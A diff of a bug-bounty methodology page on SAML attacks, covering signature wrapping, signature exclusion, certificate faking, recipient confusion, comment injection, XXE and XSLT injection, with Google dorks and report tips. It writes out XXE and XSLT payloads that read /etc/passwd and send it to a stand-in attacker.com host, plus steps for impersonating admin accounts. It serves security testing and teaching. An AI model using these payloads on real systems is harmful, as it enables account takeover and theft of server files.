@@ -1,257 +1,219 @@
-# SAML
-- **Single Sign-on (SSO) is an authentication service that allows users to utilize a single set of credentials to access multiple applications. Security Assertion Markup Language (SAML) is one of the ways one can implement SSO.**
-- **Security Assertion Markup Language (SAML) is a markup language implemented in XML.**
-- **SAML messages are base64 encoded but that is easily decoded to view the message contents.**
-- **SAML and OAuth are different protocols and are used for different purposes, OAuth is a protocol for authorization while SAML is a protocol for authentication.**
+# SAML Attacks
 
-# How it Works:
+Security Assertion Markup Language (SAML) is an XML-based protocol for implementing Single Sign-On (SSO): one set of credentials unlocks many applications. SAML messages are only Base64-encoded (trivially decoded), and parsing/verification pitfalls are rife — signature wrapping, excluded signatures, untrusted certificates and recipient confusion all let an attacker assert an identity they do not own. Real-world impact: authentication bypass and account takeover of any user (including admins) on the Service Provider.
 
-- SAML enables SSO by managing the interaction between three parties: The user(**SAML Assertion**), the identity provider, and the service provider
+Note: SAML and OAuth are different protocols for different purposes — OAuth is for **authorization**, SAML is for **authentication**.
 
-```python
-1. SAML Assertion:An XML message that contains information about the user’s identity and potentially other user attributes.
-2. Identity Provider (IdP): The service performing the authentication and issuing the Assertion. Authentication can be any number of things from username/password to 2FA.
-3. Service Provider (SP): The web application that the user wants to access.
+## Roles (how it works)
+
+```text
+1. SAML Assertion: an XML message containing information about the user's identity
+   and potentially other user attributes.
+2. Identity Provider (IdP): performs the authentication (username/password, 2FA, ...)
+   and issues the Assertion.
+3. Service Provider (SP): the web application the user wants to access.
 ```
 
-![Capture JPG](https://user-images.githubusercontent.com/33719912/157280386-aecedbe9-55d9-49fb-aa20-afc31393c5f9.jpg)
+![SAML flow](https://user-images.githubusercontent.com/33719912/157280386-aecedbe9-55d9-49fb-aa20-afc31393c5f9.jpg)
 
+## Hunting Checklist
 
-# Attacks:
+1. **Find SAML endpoints** — Google dorks and Burp search (see below); trigger "Login with SSO/SAML".
+2. Log in with a real account and **capture the SAMLResponse** (POST body, `PHNhbWx...`/`PD94bWw...` Base64 prefix) in SAML Raider.
+3. **Decode it** (Base64 → XML) and map the elements: `Response`, `Assertion`, `Subject/NameID`, `Conditions/Recipient`, `Audience`, `SubjectConfirmationData`, `ds:Signature`.
+4. Ask the client contact for a **second valid username** on the system (no credentials needed) — you need a target identity to assert.
+5. Test **signature exclusion**: remove the `<ds:Signature>` and forward; if there is no error, tamper the `NameID`/UserID.
+6. Test **XSW (signature wrapping)**: apply every one of the 8 XSW variants in SAML Raider, swapping the top/processed assertion to the victim.
+7. Test **certificate faking**: self-sign the message with an attacker cert and re-sign.
+8. Test **token recipient confusion**: try a valid token from a sibling SP on the same IdP.
+9. Test **attribute/comment injection** in NameID during registration.
+10. Test **XXE** and **XSLT** injection in the XML — both can outrun signature verification.
+11. Confirm impact by landing in the victim's session.
 
-1. **XML SIGNATURE WRAPPING (XSW):** 
-- The basic premise behind XSW is that XML documents containing XML Signatures may be processed in two separate steps: once for the validation of the digital signature, and once for the real application that uses the XML data. Consider the following two steps and the methods used to arrive at a single XML element:
-- XML Signature Validation
-    - The application locates the **`<ds:Signature>`**’s **`<ds:Reference>`** element
-    - The application uses the **`<ds:Reference>`**’s **`URI`** attribute to determine which XML element is signed
-    - The application (in)validates the signed XML element
-- After validation, the same application attempts to use the signed data as part of its normal operation.
-    - The application’s XML parser locates its desired XML element using top-down tree-based navigation
+## Test Cases & Examples
 
-```python
-- Signature wrapping attacks bypass signature validation of Sam'l assertions. This is done because the service provider does not check for multiple assertions. By sending more than one assertion within a SAML message, we're able to confuse the service provider. We are able to have our valid assertion pass through with an Invalid assertion that then assumes the identity of another user when engaged with a penetration test involving SAML. Make sure you ask your client contact for an extra username which is valid on the system for testing purposes. You won't need the credentials for this user, but you do need another user name that is valid.
-- When multiple assertion bodies are provided to the service provider with a signature wrapping attack, after the identity provider authenticated our user, we are able to confuse the service provider and then we are able to gain access to the additional users account that we provided in this case Admin.
+### Burp/Google hunting
 
-- There are total 8 types XSW attacks. (All of them can be easily done using SAMLRaider)
-
-# Steps to Perform XSW Attacks:
-1. Login to SSO
-2. Intercept the request were you can see SAML Assertions in SAML Raider
-3. Try every XSW attacks that SAML Raider offers by clicking "Apply XSW" button.
-4. Once you see XSW attack applied in SAML Raider change the top assertion value to you desire account
-5. Now Forward it through.
-6. Done, Check if you are logged in as the victim.
-
-Reference: https://www.youtube.com/watch?v=ALakvKDsZLo  
-```
-
-```python
-**Key Note:** XSW #2, XSW #1, manipulates SAML responses. The only two that deal with Responses are XSW #1 and XSW #2.
-
-XSW Attack #1
-- XSW #1 tampers with SAML responses. It accomplishes this by producing a copy of the SAML Response and Assertion, then inserting the original Signature as a child element of the copied Response into the XML. The assumption is that following signature validation, the XML parser identifies and utilises the copied Response at the top of the document rather than the original signed Response.
-XSW Attack #2
-- The primary distinction between #1 and #2 is that XSW #2 uses a detachable signature, whereas XSW #1 uses an enveloping signature. The malicious Response's position remains unchanged.
-
-**Key Note:** XSW #4 is similar to #3 they play with Assertion element.
-
-XSW Attacks #3
-- The first example of an XSW that wraps the Assertion element is XSW #3. The cloned Assertion is inserted as the first child of the root Response element by SAML Raider. The replicated Assertion is a sibling of the original Assertion.
-XSW Attakcs #4
-- XSW #4 is similar to #3, except that the original Assertion becomes a child of the duplicated Assertion in this case.
-
-**Key Note:** XSW #5 and #6 are similar and deals with Assertion Wrapping
-
-XSW Attack #5
-- XSW #5 is the first example of Assertion wrapping in which the Signature and the original Assertion are not in one of the three typical configurations (enveloped/enveloping/detached). The duplicated Assertion encircles the Signature in this example.
-XSW Attack #6
-- XSW #6 places its duplicated Assertion in the same spot as #s 4 and 5. The copy of the Assertion envelopes the Signature, which in turn envelopes the original Assertion.
-
-**Key Note:** 
-- Extensions is a valid XML element with a broader schema specification. This technique was created in response to the OpenSAML library by the authors of this white paper. To accurately compare the ID used during signature validation to the ID of the processed Assertion, OpenSAML employed schema validation. The authors discovered that if copied Assertions with the same ID as the original Assertion were children of an element with a less restrictive schema definition, they might avoid this countermeasure.
-- XSW attack #7 and #8
-
-XSW Attack #7
-- XSW #7 inserts an Extensions element and adds the copied Assertion as a child.
-XSW Attack #8
-- XSW #8 use a less restrictive XML element to execute a variant of the attack pattern employed in XSW #7. Instead of the copied Assertion, the original Assertion is the child of the less restrictive element this time.
-```
-
-2. **XML SIGNATURE EXCLUSION:**
-- Signature Exclusion is used to test how the SAML implementation behaves when there is no Signature element.
-- When a Signature element is absent the signature validation step may get skipped entirely.
-
-```python
-# Steps to Perform:
-1. Intercept SAML response.
-2. Open SAMLRaider and click "Remove Signatures" button
-3. Forward the request.
-4. If not error from SP (Service Provider) then try tampering attribute like UserID.
-5. Done!, check if you are in Vitim Account.
-
-# Other Signature Attacks:
-- Predictable signature
-- Use of encryption with a weak signature
-
-```
-
-3. **CERTIFICATE FAKING:**
-- Certificate faking is the process of testing whether or not the Service Provider verifies that a trusted Identity Provider signed the SAML Message.
-
-```python
-# Steps to Perform:
-1. Intercept SAML response in SAMLRaider.
-2. If there is a Signature included in the Response, use the "Send Certificate to SAML Raider Certs" button.
-3. After sending the certificate, we should see an imported certificate in the SAML Raider Certificates tab.
-4. We highlight the imported cert and press the "Save and Self-Sign" button.
-5. Back to Burp Proxy SAML Raider
-6. First, select the new self-signed cert from the XML Signature dropdown menu.
-7. Then use the "Remove Signatures" button to remove any existing signatures.
-8. Finally, use the "(Re-)Sign Message" or "(Re-)Sign Assertion button"
-9. After signing the message with the self-signed cert, send it on its way.
-
-- If we authenticate, we know that we can sign our SAML Messages. 
-- The ability to sign our SAML Messages means we can change values in the Assertion and they will be accepted by the Service Provider.
-```
-
-4. **TOKEN RECIPIENT CONFUSION:**
-- Token Recipient Confusion tests whether or not the Service Provider validates the Recipient.
-- The Recipient field is an attribute of the SubjectConfirmationData element, which is a child of the Subject element in a SAML Response.
-- The Recipient attribute found on the SubjectConfirmationData element is a URL that specifies the location to which the Assertion must be delivered. If the Recipient is a different Service Provider than the one who receives it, the Assertion should not be accepted.
-
-```python
-# Pre-requisite:
-- Have a Legit account on a SP to use the token we get from SP on Target-SP and both SP's should use Same IdP.
-
-# Steps to Peform:
-1. Get Token From Legit-SP
-2. Try Same on Target-SP
-3. If successful you will be able to access Target-SP resource.
-
-#Exploitation Example:
-Exploit 1: Suppose that SP SA  (Developer Department) and Starget (Sales Department) are accepting tokens from the same IdP, and the attacker does not have access to Starget .
-The attacker (e.g. a worker in the developer team) does, however, have a legitimate account on SA, thus he can request a token from the IdP for this service. By sending tA to Starget (instead of SA ), the attack is performed. It is considered successful if tA is accepted by Starget; the attacker is thus logged in with the same account name as he has for SA and gets access to Starget's corresponding resources.
-
-Exploit 2: Alternatively, the attacker can set up his own SP (Sbad ) offering some service for registered users (e.g., a weather forecast). To authenticate to Sbad, SSO is used and the attacker specifically federates it with the same IdP used by Starget . After that, the attacker lures the victim (a legitimate user of Starget ) to register with and authenticate to Sbad. Instead of or in addition to its usual service (weather forecast), Sbad stores all tokens in a database so that the attacker can access them. The attacker can then try to use the tokens to log in on Starget as the victim. The attack is considered successful, if an authentication token tbad issued for the victim for service Sbad is successfully verified on Starget .
-```
-
-5. **MISCELLANEOUS ATTACKS:**
-
-```python
-#. Simply Change Assertion Value to Victim:
-1. Intercept SAML Response in SAML Raider
-2. Change the User parameter or id to other user.
-		Example: user@email.com to admin@email.com
-3. Done, Forward the Request.
-
-# SAML: Comment Injection I
-1. Find Registeration page for SP
-2. Use comment in payload like "admin<!--comment-->@email.com" while registering
-3. SP think it as admin@email.com 
-4. Done, you are admin now ;)
-
-# SAML: Comment Injection II
-1. Find Registeration page for SP
-2. Register as any user like "admin<!--comment-->@gmail.com" ==> Invalid signature
-3. Try different "admin@gmail.com<!--comment-->.test" ==> valid signature
-4. SP think it as admin@email.com 
-5. Done, you are admin now ;)
-```
-
-6. **XXE  in SAML:**
-
-```python
-**NOTE:** You can try all XXE attack techniques here its not limited to this only.
-
-# SIMPLE XXE ATTACK:
-1. Intercept the SAML Response in SAML Raider
-2. Add XXE payload in the beginning like below:
-		<?xml version="1.0" encoding="UTF-8"?>
-		 <!DOCTYPE foo [  
-	   <!ELEMENT foo ANY >
-	   <!ENTITY    file SYSTEM "file:///etc/passwd">
-	   <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
-3. Send the Request and check the response.
-4. Done, escalate further!.
-```
-
-7. **XSLT in SAML:**
-
-```python
-**NOTE:**
-- The attack doesn’t require a valid signature to succeed.
-- The XSLT transformation occurs before the digital signature is processed for verification.
-
-# Steps to Perform:
-1**. Intercept the SAML Response in SAML Raider.
-2. Add XSLT payload in side transforms assertion like below.
-		<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
-	  ...
-	    <ds:Transforms>
-	      <ds:Transform>
-	        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-	          <xsl:template match="doc">
-	            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
-	            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
-	            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
-	            <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
-	            <xsl:value-of select="unparsed-text($exploitUrl)"/>
-	          </xsl:template>
-	        </xsl:stylesheet>
-	      </ds:Transform>
-	    </ds:Transforms>
-	  ...
-		</ds:Signature>
-3. Forward the request and check response.
-4. Done Escalate Further.!! 
-```
-
-# Tools:
-
-[SAML Encoder - Online SAML Request-Response Encode Tool - Base64 - Deflate](https://www.samltool.com/encode.php)
-
-[https://github.com/CompassSecurity/SAMLRaider](https://github.com/CompassSecurity/SAMLRaider)
-
-[GitHub - fadyosman/SAMLExtractor: A tool that can take a URL or list of URL and prints back SAML consume URL.](https://github.com/fadyosman/SAMLExtractor)
-
-# Labs:
-
-[GitHub - yogisec/VulnerableSAMLApp: Vulnerable SAML infrastructure training applicaiton](https://github.com/yogisec/VulnerableSAMLApp)
-
-# Reference:
-
-[How to Hunt Bugs in SAML; a Methodology - Part I -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
-
-[How to Hunt Bugs in SAML; a Methodology - Part II -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
-
-[How to Hunt Bugs in SAML; a Methodology - Part III -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
-
-[https://sso-attacks.org/Main_Page](https://sso-attacks.org/Main_Page)
-
-[https://research.aurainfosec.io/bypassing-saml20-SSO/](https://research.aurainfosec.io/bypassing-saml20-SSO/)
-
-[SAML From A Hackers Perspective - Part 1 Intro](https://www.youtube.com/watch?v=KEwki41ZWmg&list=PLCwnLq3tOElrEU-KoOdeiixiNCWkeQ99F&index=1)
-
-[Verification of SAML Tokens - Traps and Pitfalls](https://web-in-security.blogspot.com/2014/10/verification-of-saml-tokens-traps-and.html)
-
-## Mind-Maps:
-
-- [Mind Map by Harsh Bothra Checklist for SAML.pdf](https://drive.google.com/file/d/1iLgbd9IbcYgu4n1yJAVUyYbWnzYXmbyp/view?usp=drivesdk)
-
-![https://raw.githubusercontent.com/0xInfection/Stuff/master/mindmaps/mind-map-saml.png](https://raw.githubusercontent.com/0xInfection/Stuff/master/mindmaps/mind-map-saml.png)
-
-# Tips:
-
-```python
-Google Dork to Find SAML logins:
+```text
+Google dorks to find SAML logins:
 inurl:"/saml2?SAMLRequest="
 inurl:"/simplesaml/module.php/core/loginuserpass.php?AuthState="
 inurl:"simplesaml/saml2/idp"
 
-Burp search [SAMLResponse]
- 1.PHNhbWx -> b64decode -> '<saml'
- 2.PD94bWw -> b64decode -> '<?xml'
+Burp search [SAMLResponse]:
+  1. PHNhbWx -> base64 decode -> '<saml'
+  2. PD94bWw -> base64 decode -> '<?xml'
 ```
 
-### Author:
-- [Kathan Patel](https://twitter.com/KathanP19)
+### 1. XML Signature Wrapping (XSW)
+
+The premise: an XML document with an XML Signature is often processed in **two separate steps** — signature validation and then the real application consuming the data:
+
+```text
+- Signature validation:
+  the app finds the <ds:Reference> element of the <ds:Signature>,
+  uses its URI attribute to locate the signed element,
+  and (in)validates that element.
+- Data usage:
+  the app's XML parser then locates its desired element via
+  top-down tree-based navigation — which may NOT be the validated one.
+```
+
+XSW bypasses signature validation because the SP **does not check for multiple assertions**: send a valid signed assertion *plus* an invalid/unsigned one that impersonates another user (e.g. Admin); after the IdP authenticates *our* user, the confusion grants access to the other account. There are 8 XSW types, all easily applied with SAML Raider.
+
+Steps:
+1. Log in to the SSO.
+2. Intercept the request where SAML assertions are visible in SAML Raider.
+3. Try every XSW attack via the **"Apply XSW"** button.
+4. Once applied, change the **top assertion** value to your desired account.
+5. Forward, and check whether you land in the victim's session.
+
+Variants (reference: [video](https://www.youtube.com/watch?v=ALakvKDsZLo)):
+
+- **XSW #1 / #2 — the two that manipulate *Responses*.** #1 clones the Response+Assertion and inserts the original Signature as a child of the *copied* Response — the parser then picks the copy at the top instead of the signed original (enveloping signature). #2 is the same but with a **detached** signature; the malicious Response's position stays unchanged.
+- **XSW #3 / #4 — Assertion elements.** #3: cloned Assertion inserted as first child of the root Response, sibling of the original. #4: like #3, but the original Assertion becomes a *child* of the duplicated Assertion.
+- **XSW #5 / #6 — Assertion wrapping.** #5: the duplicated Assertion encircles the Signature (neither enveloped/enveloping/detached configuration). #6: copy sits where #4/#5 put theirs and envelopes the Signature, which in turn envelopes the original Assertion.
+- **XSW #7 / #8 — Extensions (schema) abuse.** Extensions is a valid element with a broader schema. OpenSAML compared the ID used during validation to the processed Assertion's ID via schema validation — but copied Assertions with the *same ID* placed under a less-restrictive element evade that check. #7 inserts an Extensions element with the copied Assertion as child; #8 is the variant where the **original** Assertion is the child of the less restrictive element.
+
+### 2. XML Signature Exclusion
+
+Tests how the implementation behaves when **no Signature element exists** — the validation step may get skipped entirely.
+
+1. Intercept the SAML response.
+2. In SAML Raider click **"Remove Signatures"**.
+3. Forward. If the SP returns no error, tamper attributes like UserID/NameID.
+4. Check whether you are in the victim's account.
+
+Related signature attacks: predictable signature, use of encryption with a weak signature.
+
+### 3. Certificate Faking
+
+Tests whether the SP verifies that a **trusted IdP** signed the message.
+
+1. Intercept the SAML response in SAML Raider.
+2. If a Signature is included, use **"Send Certificate to SAML Raider Certs"**.
+3. In the SAML Raider Certificates tab, highlight the imported cert and press **"Save and Self-Sign"**.
+4. Back in the SAML Raider proxy tab: select the new self-signed cert from the **XML Signature dropdown**.
+5. **"Remove Signatures"**, then **"(Re-)Sign Message"** or **"(Re-)Sign Assertion"**.
+6. Forward. Successful auth ⇒ you can sign your own SAML messages, i.e. change any Assertion value (NameID, attributes) and have the SP accept it.
+
+### 4. Token Recipient Confusion
+
+Tests whether the SP validates the **Recipient** — an attribute of `SubjectConfirmationData` (child of `Subject`) giving the URL the Assertion must be delivered to. If the Recipient is a *different* SP than the one receiving it, the Assertion must not be accepted.
+
+Pre-requisite: a legitimate account on some SP using the **same IdP** as the target.
+
+1. Get a token from Legit-SP.
+2. Submit the same token to Target-SP.
+3. If accepted, you access Target-SP resources as that account.
+
+```text
+Exploit 1: SP_A (Developer dept) and SP_target (Sales dept) accept tokens from the same IdP.
+The attacker (a developer-team worker) has a legit account on SP_A, so they request token
+tA from the IdP for that service — then send tA to SP_target instead of SP_A. If accepted,
+the attacker is logged into SP_target under the same account name and gets its resources.
+
+Exploit 2: The attacker sets up their own SP (S_bad, e.g. a weather-forecast service) and
+specifically federates it via SSO with the same IdP used by SP_target. They lure a victim
+(a legit SP_target user) to register and authenticate at S_bad, which secretly stores all
+tokens in a database. The attacker then replays the victim's t_bad on SP_target; success =
+logged into SP_target as the victim.
+```
+
+### 5. Miscellaneous attacks
+
+**Direct assertion tampering:**
+1. Intercept the SAML Response in SAML Raider.
+2. Change the User parameter/id to another user — e.g. `user@email.com` → `admin@email.com`.
+3. Forward.
+
+**Comment injection I** — find the SP's registration page and register with:
+
+```text
+admin<!--comment-->@email.com
+```
+
+The SP parses it as `admin@email.com` → you are the admin.
+
+**Comment injection II** — same idea when the first form is rejected:
+
+```text
+"admin<!--comment-->@gmail.com"  ==> Invalid signature
+"admin@gmail.com<!--comment-->.test" ==> valid signature
+```
+
+Register with the second form; the SP still sees `admin@gmail.com`.
+
+### 6. XXE in SAML
+
+All XXE techniques apply — not limited to this example. Add a DOCTYPE at the beginning of the intercepted SAML Response:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY file SYSTEM "file:///etc/passwd">
+  <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
+```
+
+Send and inspect the response, then escalate (file read → SSRF → external DTD).
+
+### 7. XSLT injection in SAML
+
+> Note: the attack does **not** require a valid signature — the XSLT transformation happens *before* the digital signature is processed for verification.
+
+Place an XSLT stylesheet inside the assertion's Transforms:
+
+```xml
+<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+  ...
+    <ds:Transforms>
+      <ds:Transform>
+        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+          <xsl:template match="doc">
+            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
+            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
+            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
+            <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
+            <xsl:value-of select="unparsed-text($exploitUrl)"/>
+          </xsl:template>
+        </xsl:stylesheet>
+      </ds:Transform>
+    </ds:Transforms>
+  ...
+</ds:Signature>
+```
+
+Forward and watch the exfiltrated file arrive at attacker.com, then escalate.
+
+## Bypass Techniques
+
+- Signature validation skipped: **absence** of `<ds:Signature>` (exclusion) vs **ignored** signature (wrap the processed assertion around an unrelated signed node).
+- Parser-vs-validator divergence is the core of all 8 XSW variants — try each element position (Response copy, Assertion sibling/child/parent, Extensions child).
+- Trust bypass via self-signed certificate re-signing (certificate faking).
+- Cross-service token acceptance when `Recipient`/`Audience` is not checked.
+- Parser comment handling to split/normalize `NameID` (`admin<!--x-->@corp.com`).
+- XML-layer attacks (XXE, XSLT) that execute before signature verification.
+
+## Tools & Resources
+
+- [SAML Raider (Burp extension)](https://github.com/CompassSecurity/SAMLRaider) — certs, XSW one-click, sign/remove
+- [SAML Encoder (samltool.com)](https://www.samltool.com/encode.php) — Base64/deflate encode-decode
+- [SAMLExtractor](https://github.com/fadyosman/SAMLExtractor) — find SAML consume URLs from a URL list
+- [yogisec/VulnerableSAMLApp](https://github.com/yogisec/VulnerableSAMLApp) — practice lab
+- [How to Hunt Bugs in SAML, a Methodology I–III (epi052)](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/) — [II](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) / [III](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
+- [sso-attacks.org](https://sso-attacks.org/Main_Page) — catalogue of SAML/SSO attacks
+- [Bypassing SAML 2.0 SSO (Aura InfoSec)](https://research.aurainfosec.io/bypassing-saml20-SSO/)
+- [Verification of SAML Tokens — Traps and Pitfalls](https://web-in-security.blogspot.com/2014/10/verification-of-saml-tokens-traps-and.html)
+- [SAML From A Hacker's Perspective (video)](https://www.youtube.com/watch?v=KEwki41ZWmg&list=PLCwnLq3tOElrEU-KoOdeiixiNCWkeQ99F&index=1)
+- Mindmaps: [Harsh Bothra SAML checklist (PDF)](https://drive.google.com/file/d/1iLgbd9IbcYgu4n1yJAVUyYbWnzYXmbyp/view?usp=drivesdk)
+
+![SAML mindmap](https://raw.githubusercontent.com/0xInfection/Stuff/master/mindmaps/mind-map-saml.png)
+
+## Report Tips
+
+- "Any XML assertion can be forged → login as ANY user (incl. admins) without credentials" = auth bypass / full account takeover; usually critical on SSO perimeters.
+- For recipient confusion, show the sibling-SP token accepted by the target — proof the tenant isolation assumption is broken.
+- For XXE/XSLT, pair the identity angle with the file-read/SSF evidence (e.g. `/etc/passwd` exfiltration) for maximum triage clarity.
+
+**Author:** [Kathan Patel](https://twitter.com/KathanP19)
